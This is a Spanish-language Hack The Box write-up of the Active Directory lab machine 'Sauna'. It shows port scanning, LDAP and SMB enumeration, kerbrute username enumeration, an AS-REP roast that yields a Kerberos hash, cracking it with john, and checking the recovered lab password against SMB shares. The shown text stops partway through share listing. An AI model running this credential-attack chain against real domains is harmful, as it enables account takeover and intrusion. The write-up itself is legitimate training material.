---
layout: single
title: Sauna - Hack The Box
excerpt: "En este post estaremos resolviendo la maquina Sauna de la plataforma de Hackthebox donde estaremos tocando temas de Active Directory mediante un un script de Nmap podremos hacer un reconocimiento basico de Ldap donde encontremos un usuario y muchos mas usuarios en la pagina web que corre en el puerto 80 solo 2 de esos usuarios kerbrute nos lo dara como validos vamos a emplear un ASRepRoast para obtener el hash de un usuario y procederemos a crackearlo para conectarnos con evil-winrm ademas encontraremos otro usuario el cual vamos a ver una contraseña en texto claro para migrar a otro usuario para la escalada de privilegios haremos un DCSync Attack"
date: 2023-06-09
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/htb-writeup-sauna/icon.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - ASRepRoast Attack 
  - Cracking Hashes
  - DCSync Attack - Secretsdump
  - PassTheHash
  - BloodHound
  - Active Directory
---

⮕ Maquina Windows

Maquina Windows nos damos cuenta por el `ttl`

```bash
❯ ping -c 1 10.10.10.175
PING 10.10.10.175 (10.10.10.175) 56(84) bytes of data.
64 bytes from 10.10.10.175: icmp_seq=1 ttl=127 time=110 ms

--- 10.10.10.175 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 110.186/110.186/110.186/0.000 ms
❯ whichSystem.py 10.10.10.175

10.10.10.175 (ttl -> 127): Windows
```

## Portscan

```bash
❯ nmap -sCV -p53,80,88,135,139,389,3268,445,464,5985,49674,49696,636,9389 10.10.10.175 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 11:11 CST
Nmap scan report for 10.10.10.175
Host is up (0.12s latency).

PORT      STATE    SERVICE       VERSION
53/tcp    open     domain        Simple DNS Plus
80/tcp    open     http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Egotistical Bank :: Home
88/tcp    open     kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-10 00:12:04Z)
135/tcp   open     msrpc         Microsoft Windows RPC
139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open     ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp   open     microsoft-ds?
464/tcp   open     kpasswd5?
636/tcp   open     tcpwrapped
3268/tcp  filtered globalcatLDAP
5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open     mc-nmf        .NET Message Framing
49674/tcp open     msrpc         Microsoft Windows RPC
49696/tcp open     msrpc         Microsoft Windows RPC
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-06-10T00:12:55
|_  start_date: N/A
|_clock-skew: 6h59m58s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required

```

## Enumeracion 

Vamos a comenzar usando **crackmapexec** para ver ante que estamos 

```bash
❯ crackmapexec smb 10.10.10.175
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
```

Si tratamos de listas recursos compartidos a nivel de red por **SMB** empleando un **Null Session** por que no disponemos de credenciales vemos que no hay nada

```bash
❯ smbclient -L 10.10.10.175 -N
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
❯ smbmap -H 10.10.10.175
[+] IP: 10.10.10.175:445	Name: 10.10.10.175                                      
```

Ahora vamos a enumerar el puerto **80** que corre un servicio **Web** 

```ruby
❯ whatweb http://10.10.10.175
http://10.10.10.175 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[example@email.com,info@example.com], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.175], Microsoft-IIS[10.0], Script, Title[Egotistical Bank :: Home]
```

Al parecer vemos que es un **Banco** 

![](/assets/images/htb-writeup-sauna/web1.png)

Vamos **fuzzing** para ver si hay alguna ruta de interés 

Pues bueno vamos a ver la ruta de **about.html** 

```bash
❯ dirsearch -u http://10.10.10.175

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10903

Output File: /usr/lib/python3/dist-packages/dirsearch/reports/10.10.10.175/_23-06-09_11-17-34.txt

Error Log: /usr/lib/python3/dist-packages/dirsearch/logs/errors-23-06-09_11-17-34.log

Target: http://10.10.10.175/

[11:17:34] Starting: 
[11:17:35] 403 -  312B  - /%2e%2e//google.com
[11:17:58] 403 -  312B  - /\..\..\..\..\..\..\..\..\..\etc\passwd
[11:18:00] 200 -   30KB - /about.html
[11:18:27] 200 -   15KB - /contact.html
[11:18:28] 301 -  147B  - /css  ->  http://10.10.10.175/css/
[11:18:36] 301 -  149B  - /fonts  ->  http://10.10.10.175/fonts/
[11:18:39] 301 -  150B  - /images  ->  http://10.10.10.175/images/
[11:18:39] 403 -    1KB - /images/
[11:18:40] 200 -   32KB - /index.html

Task Completed
```

Y bueno ya tenemos nombres de usuarios que al parecer son empleados del banco como el puerto de  **kerberos** esta abierto podemos añadirlos a una lista y ver con **kerbrute** si podemos hacer un **ASREProastattack** para solicitar un **TGT**, ya que se utiliza autenticacion Kerberos 

![](/assets/images/htb-writeup-sauna/web3.png)

Antes de hacer todo esto tenemos que agregar el dominio al **/etc/hosts/**

```bash
❯ echo "10.10.10.175 EGOTISTICAL-BANK.LOCAL" | sudo tee -a /etc/hosts
10.10.10.175 EGOTISTICAL-BANK.LOCAL
❯ ping -c 1 EGOTISTICAL-BANK.LOCAL
PING EGOTISTICAL-BANK.LOCAL (10.10.10.175) 56(84) bytes of data.
64 bytes from EGOTISTICAL-BANK.LOCAL (10.10.10.175): icmp_seq=1 ttl=127 time=113 ms

--- EGOTISTICAL-BANK.LOCAL ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 113.225/113.225/113.225/0.000 ms

```

El puerto de **Ldap** también esta abierto vamos a enumerarlo para ver si encontramos algo interesante o vamos directamente hacer lo antes mencionado <https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap>

Podemos aplicar esto para enumerar este servicio

```bash
❯ nmap -n -sV --script "ldap* and not brute" 10.10.10.175
Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-09 11:31 CST
Nmap scan report for 10.10.10.175
Host is up (0.17s latency).
Not shown: 990 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
53/tcp  open  domain        Simple DNS Plus
80/tcp  open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
88/tcp  open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-10 00:32:07Z)
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL, Site: Default-First-Site-Name)
| ldap-rootdse: 
| LDAP Results
|   <ROOT>
|       domainFunctionality: 7
|       forestFunctionality: 7
|       domainControllerFunctionality: 7
|       rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
|       ldapServiceName: EGOTISTICAL-BANK.LOCAL:sauna$@EGOTISTICAL-BANK.LOCAL
|       isGlobalCatalogReady: TRUE
|       supportedSASLMechanisms: GSSAPI
|       supportedSASLMechanisms: GSS-SPNEGO
|       supportedSASLMechanisms: EXTERNAL
|       supportedSASLMechanisms: DIGEST-MD5
|       supportedLDAPVersion: 3
|       supportedLDAPVersion: 2
|       supportedLDAPPolicies: MaxPoolThreads
|       supportedLDAPPolicies: MaxPercentDirSyncRequests
|       supportedLDAPPolicies: MaxDatagramRecv
|       supportedLDAPPolicies: MaxReceiveBuffer
|       supportedLDAPPolicies: InitRecvTimeout
|       supportedLDAPPolicies: MaxConnections
|       supportedLDAPPolicies: MaxConnIdleTime
|       supportedLDAPPolicies: MaxPageSize
|       supportedLDAPPolicies: MaxBatchReturnMessages
|       supportedLDAPPolicies: MaxQueryDuration
|       supportedLDAPPolicies: MaxDirSyncDuration
|       supportedLDAPPolicies: MaxTempTableSize
|       supportedLDAPPolicies: MaxResultSetSize
|       supportedLDAPPolicies: MinResultSets
|       supportedLDAPPolicies: MaxResultSetsPerConn
|       supportedLDAPPolicies: MaxNotificationPerConn
|       supportedLDAPPolicies: MaxValRange
|       supportedLDAPPolicies: MaxValRangeTransitive
|       supportedLDAPPolicies: ThreadMemoryLimit
|       supportedLDAPPolicies: SystemMemoryLimitPercent
|       supportedControl: 1.2.840.113556.1.4.319
|       supportedControl: 1.2.840.113556.1.4.801
|       supportedControl: 1.2.840.113556.1.4.473
|       supportedControl: 1.2.840.113556.1.4.528
|       supportedControl: 1.2.840.113556.1.4.417
|       supportedControl: 1.2.840.113556.1.4.619
|       supportedControl: 1.2.840.113556.1.4.841
|       supportedControl: 1.2.840.113556.1.4.529
|       supportedControl: 1.2.840.113556.1.4.805
|       supportedControl: 1.2.840.113556.1.4.521
|       supportedControl: 1.2.840.113556.1.4.970
|       supportedControl: 1.2.840.113556.1.4.1338
|       supportedControl: 1.2.840.113556.1.4.474
|       supportedControl: 1.2.840.113556.1.4.1339
|       supportedControl: 1.2.840.113556.1.4.1340
|       supportedControl: 1.2.840.113556.1.4.1413
|       supportedControl: 2.16.840.1.113730.3.4.9
|       supportedControl: 2.16.840.1.113730.3.4.10
|       supportedControl: 1.2.840.113556.1.4.1504
|       supportedControl: 1.2.840.113556.1.4.1852
|       supportedControl: 1.2.840.113556.1.4.802
|       supportedControl: 1.2.840.113556.1.4.1907
|       supportedControl: 1.2.840.113556.1.4.1948
|       supportedControl: 1.2.840.113556.1.4.1974
|       supportedControl: 1.2.840.113556.1.4.1341
|       supportedControl: 1.2.840.113556.1.4.2026
|       supportedControl: 1.2.840.113556.1.4.2064
|       supportedControl: 1.2.840.113556.1.4.2065
|       supportedControl: 1.2.840.113556.1.4.2066
|       supportedControl: 1.2.840.113556.1.4.2090
|       supportedControl: 1.2.840.113556.1.4.2205
|       supportedControl: 1.2.840.113556.1.4.2204
|       supportedControl: 1.2.840.113556.1.4.2206
|       supportedControl: 1.2.840.113556.1.4.2211
|       supportedControl: 1.2.840.113556.1.4.2239
|       supportedControl: 1.2.840.113556.1.4.2255
|       supportedControl: 1.2.840.113556.1.4.2256
|       supportedControl: 1.2.840.113556.1.4.2309
|       supportedControl: 1.2.840.113556.1.4.2330
|       supportedControl: 1.2.840.113556.1.4.2354
|       supportedCapabilities: 1.2.840.113556.1.4.800
|       supportedCapabilities: 1.2.840.113556.1.4.1670
|       supportedCapabilities: 1.2.840.113556.1.4.1791
|       supportedCapabilities: 1.2.840.113556.1.4.1935
|       supportedCapabilities: 1.2.840.113556.1.4.2080
|       supportedCapabilities: 1.2.840.113556.1.4.2237
|       subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       serverName: CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       schemaNamingContext: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|       namingContexts: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|       isSynchronized: TRUE
|       highestCommittedUSN: 98378
|       dsServiceName: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|       dnsHostName: SAUNA.EGOTISTICAL-BANK.LOCAL
|       defaultNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL
|       currentTime: 20230610003213.0Z
|_      configurationNamingContext: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
| ldap-search: 
|   Context: DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: DC=EGOTISTICAL-BANK,DC=LOCAL
|         objectClass: top
|         objectClass: domain
|         objectClass: domainDNS
|         distinguishedName: DC=EGOTISTICAL-BANK,DC=LOCAL
|         instanceType: 5
|         whenCreated: 2020/01/23 05:44:25 UTC
|         whenChanged: 2023/06/09 23:53:44 UTC
|         subRefs: DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|         subRefs: DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL
|         subRefs: CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         uSNCreated: 4099
|         dSASignature: \x01\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC
|         uSNChanged: 98336
|         name: EGOTISTICAL-BANK
|         objectGUID: 504e6ec-c122-a143-93c0-cf487f83363
|         replUpToDateVector: \x02\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00F\xC6\xFFTH\x85uJ\xBF	\xC2\xD4\x05j\xE2\x8F\x16\x80\x01\x00\x00\x00\x00\x00\x87L\x94\x1A\x03\x00\x00\x00\xAB\x8C\xEFx\xD1I\x85D\xB2\xC2\xED\x9Ce\xFE\xAF\xAD\x0C\xE0\x00\x00\x00\x00\x00\x00(8\xFE\x16\x03\x00\x00\x00\xDC\xD1T\x81\xF1a.B\xB4D
|         @	\xE6\x84u\x15p\x01\x00\x00\x00\x00\x00\xD4n\x0F\x17\x03\x00\x00\x00\xFDZ\x85\x92F\xDE^A\xAAVnj@#\xF6\x0C\x0B\xD0\x00\x00\x00\x00\x00\x00\xD0\xF0
|         \x15\x03\x00\x00\x00\x9B\xF0\xC5\x9Fl\x1D|E\x8B\x15\xFA/\x1A>\x13N\x14`\x01\x00\x00\x00\x00\x00\x10\xD5\x00\x17\x03\x00\x00\x00@\xBE\xE0\xB3\xC6%\xECD\xB2\xB9\x9F\xF8\D\xB2\xEC	\xB0\x00\x00\x00\x00\x00\x00\xD4\x04R\x14\x03\x00\x00\x00
|         creationTime: 133308284249331308
|         forceLogoff: -9223372036854775808
|         lockoutDuration: -18000000000
|         lockOutObservationWindow: -18000000000
|         lockoutThreshold: 0
|         maxPwdAge: -36288000000000
|         minPwdAge: -864000000000
|         minPwdLength: 7
|         modifiedCountAtLastProm: 0
|         nextRid: 1000
|         pwdProperties: 1
|         pwdHistoryLength: 24
|         objectSid: 1-5-21-2966785786-3096785034-1186376766
|         serverState: 1
|         uASCompat: 1
|         modifiedCount: 1
|         auditingPolicy: \x00\x01
|         nTMixedDomain: 0
|         rIDManagerReference: CN=RID Manager$,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|         fSMORoleOwner: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         systemFlags: -1946157056
|         wellKnownObjects: B:32:6227F0AF1FC2410D8E3BB10615BB5B0F:CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:F4BE92A4C777485E878E9421D53087DB:CN=Microsoft,CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:09460C08AE1E4A4EA0F64AEE7DAA1E5A:CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:22B70C67D56E4EFB91E9300FCA3DC1AA:CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:18E2EA80684F11D2B9AA00C04F79F805:CN=Deleted Objects,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:2FBAC1870ADE11D297C400C04FD8D5CD:CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:AB8153B7768811D1ADED00C04FD8D5CD:CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:AB1D30F3768811D1ADED00C04FD8D5CD:CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:A361B2FFFFD211D1AA4B00C04FD7D83A:OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:AA312825768811D1ADED00C04FD8D5CD:CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
|         wellKnownObjects: B:32:A9D1CA15768811D1ADED00C04FD8D5CD:CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
|         objectCategory: CN=Domain-DNS,CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         isCriticalSystemObject: TRUE
|         gPLink: [LDAP://CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL;0]
|         dSCorePropagationData: 1601/01/01 00:00:00 UTC
|         otherWellKnownObjects: B:32:683A24E2E8164BD3AF86AC3C2CF3F981:CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
|         otherWellKnownObjects: B:32:1EB93889E40C45DF9F0C64D23BBB6237:CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
|         masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         ms-DS-MachineAccountQuota: 10
|         msDS-Behavior-Version: 7
|         msDS-PerUserTrustQuota: 1
|         msDS-AllUsersTrustQuota: 1000
|         msDS-PerUserTrustTombstonesQuota: 10
|         msDs-masteredBy: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         msDS-IsDomainFor: CN=NTDS Settings,CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL
|         msDS-NcType: 0
|         msDS-ExpirePasswordsOnSmartCardOnlyAccounts: TRUE
|         dc: EGOTISTICAL-BANK
|     dn: CN=Users,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Computers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: OU=Domain Controllers,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=System,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=LostAndFound,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Infrastructure,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=ForeignSecurityPrincipals,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Program Data,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=NTDS Quotas,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Managed Service Accounts,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Keys,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=TPM Devices,DC=EGOTISTICAL-BANK,DC=LOCAL
|     dn: CN=Builtin,DC=EGOTISTICAL-BANK,DC=LOCAL
|_    dn: CN=Hugo Smith,DC=EGOTISTICAL-BANK,DC=LOCAL
445/tcp open  microsoft-ds?
464/tcp open  kpasswd5?
593/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp open  tcpwrapped
Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows
```

Bueno tenemos un nuevo usuario que al parecer nosotros no en la web no sabemos si sea empleado o alguna otra cosa igual lo vamos agregar ala lista para ver si el usuario aplica para el ataque que vamos a hacer `Hugo Smith`

Bueno casi siempre en los entornos de **AD** los usuarios suelen ser la primer letra de su nombre y después su apellido entonces basándonos en todos los nombres que tenemos asta ahora ya podemos hacer la lista 

```bash
❯ catn users
hsmith
fsmith
scoins
hbear
skerb
btaylor
sdriver
scoins
```

Puedes descargarte la herramienta de **kerbrute** desde su repositorio <https://github.com/ropnop/kerbrute/releases>

```bash
❯ ./kerbrute -h

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/09/23 - Ronnie Flathers @ropnop

This tool is designed to assist in quickly bruteforcing valid Active Directory accounts through Kerberos Pre-Authentication.
It is designed to be used on an internal Windows domain with access to one of the Domain Controllers.
Warning: failed Kerberos Pre-Auth counts as a failed login and WILL lock out accounts

Usage:
  kerbrute [command]

Available Commands:
  bruteforce    Bruteforce username:password combos, from a file or stdin
  bruteuser     Bruteforce a single user's password from a wordlist
  help          Help about any command
  passwordspray Test a single password against a list of users
  userenum      Enumerate valid domain usernames via Kerberos
  version       Display version info and quit

Flags:
      --dc string       The location of the Domain Controller (KDC) to target. If blank, will lookup via DNS
      --delay int       Delay in millisecond between each attempt. Will always use single thread if set
  -d, --domain string   The full domain to use (e.g. contoso.com)
  -h, --help            help for kerbrute
  -o, --output string   File to write logs to. Optional.
      --safe            Safe mode. Will abort if any user comes back as locked out. Default: FALSE
  -t, --threads int     Threads to use (default 10)
  -v, --verbose         Log failures and errors

Use "kerbrute [command] --help" for more information about a command.
```

Vamos aplicar un **userenum** e indicando la lista ya vemos que estos 2 usuarios son validos

```bash
❯ ./kerbrute userenum users --dc EGOTISTICAL-BANK.LOCAL -d EGOTISTICAL-BANK.LOCAL

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/09/23 - Ronnie Flathers @ropnop

2023/06/09 11:41:18 >  Using KDC(s):
2023/06/09 11:41:18 >  	EGOTISTICAL-BANK.LOCAL:88

2023/06/09 11:41:18 >  [+] VALID USERNAME:	hsmith@EGOTISTICAL-BANK.LOCAL
2023/06/09 11:41:18 >  [+] VALID USERNAME:	fsmith@EGOTISTICAL-BANK.LOCAL
2023/06/09 11:41:18 >  Done! Tested 8 usernames (2 valid) in 0.144 seconds
```

# GetNPUsers.py 

Ahora si podemos crackear el **hash** de solo un usuario 

```bash
❯ GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -no-pass -usersfile users
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User hsmith doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:bc88eca46b629cb4cfb7f20b683b013d$2a6606a096df08d50e5d26bc11a86de24121eee4ce4c74d949007df65faf3ab5915b8fc4643041dc44949d5772e017658fed479ba42c3192aabfd246bb0e85f7b4137072884a6772d227b0d7750d8474d7670f14f604c9a8db48524c020a57280893b36e54f59a667ee8251af5eca25345854f64c2a28d17c6fc13849772db39a5bfaa9474cfc6bd4e4a71f709f5b3c09bcbec7df271f4159ac87c9006e2eb3380c64242551331be27f0f5829391bf4932e3f026f5efb13df52adf189540f84b693beba5baa0e4436e73b00281d0f5b7f56c4fbcf7570cf1c50fa9107ac7760b3bf39dd29db67abd1be5734f4c76c5d85e2f468634ba63409026956ea88d9fd0
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
[-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database)
```

```bash
❯ catn hash
$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:bc88eca46b629cb4cfb7f20b683b013d$2a6606a096df08d50e5d26bc11a86de24121eee4ce4c74d949007df65faf3ab5915b8fc4643041dc44949d5772e017658fed479ba42c3192aabfd246bb0e85f7b4137072884a6772d227b0d7750d8474d7670f14f604c9a8db48524c020a57280893b36e54f59a667ee8251af5eca25345854f64c2a28d17c6fc13849772db39a5bfaa9474cfc6bd4e4a71f709f5b3c09bcbec7df271f4159ac87c9006e2eb3380c64242551331be27f0f5829391bf4932e3f026f5efb13df52adf189540f84b693beba5baa0e4436e73b00281d0f5b7f56c4fbcf7570cf1c50fa9107ac7760b3bf39dd29db67abd1be5734f4c76c5d85e2f468634ba63409026956ea88d9fd0

```

# Crack Hash 

Ahora lo crackeamos 

```bash
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 512/512 AVX512BW 16x])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Thestrokes23     ($krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL)
1g 0:00:00:20 DONE (2023-06-09 12:10) 0.04780g/s 503776p/s 503776c/s 503776C/s Thrall..Thehunter22
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

# fsmith

Ahora lo que sigue es validar que las credenciales sean correctas para eso vamos a usar la herramienta de `crackmapexec`

```bash
❯ crackmapexec smb 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
SMB         10.10.10.175    445    SAUNA            [*] Windows 10.0 Build 17763 x64 (name:SAUNA) (domain:EGOTISTICAL-BANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.10.10.175    445    SAUNA            [+] EGOTISTICAL-BANK.LOCAL\fsmith:Thestrokes23 

```

Tenemos permisos de lectura en algunas recursos

```bash
❯ smbmap -H 10.10.10.175 -u 'fsmith' -p 'Thestrokes23'
[+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	print$                                            	READ ONLY	Printer Drivers
	RICOH Aficio SP 8300DN PCL 6                      	NO ACCESS	We cant print money
	SYSVOL                                            	READ ONLY	Logon server share 
```

```bash
❯ smbmap -H 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -r SYSVOL
[+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	SYSVOL                                            	READ ONLY	
	.\SYSVOL\*
	dr--r--r--                0 Wed Jan 22 23:44:49 2020	.
	dr--r--r--                0 Wed Jan 22 23:44:49 2020	..
	dr--r--r--                0 Wed Jan 22 23:44:49 2020	EGOTISTICAL-BANK.LOCAL
```

```bash
❯ smbmap -H 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -r SYSVOL/EGOTISTICAL-BANK.LOCAL
[+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	SYSVOL                                            	READ ONLY	
	.\SYSVOLEGOTISTICAL-BANK.LOCAL\*
	dr--r--r--                0 Wed Jan 22 23:51:08 2020	.
	dr--r--r--                0 Wed Jan 22 23:51:08 2020	..
	dr--r--r--                0 Fri Jun  9 17:54:25 2023	DfsrPrivate
	dr--r--r--                0 Sat Jan 25 14:48:44 2020	Policies
	dr--r--r--                0 Wed Jan 22 23:44:49 2020	scripts

```

No hay nada en **scripts** 

```bash
❯ smbmap -H 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -r SYSVOL/EGOTISTICAL-BANK.LOCAL/scripts
[+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	SYSVOL                                            	READ ONLY	
	.\SYSVOLEGOTISTICAL-BANK.LOCAL\scripts\*
	dr--r--r--                0 Wed Jan 22 23:44:49 2020	.
	dr--r--r--                0 Wed Jan 22 23:44:49 2020	..
```

En este recurso como tal nos esta dando un error tal vez lo mas probable es que no tengamos permiso de lectura en ese recurso 

```bash
❯ smbmap -H 10.10.10.175 -u 'fsmith' -p 'Thestrokes23' -r SYSVOL/EGOTISTICAL-BANK.LOCAL/DfsrPrivate
[+] IP: 10.10.10.175:445	Name: EGOTISTICAL-BANK.LOCAL                            
[!] Something weird happened: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.) on line 881
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	SYSVOL                                            	READ ONLY	
```

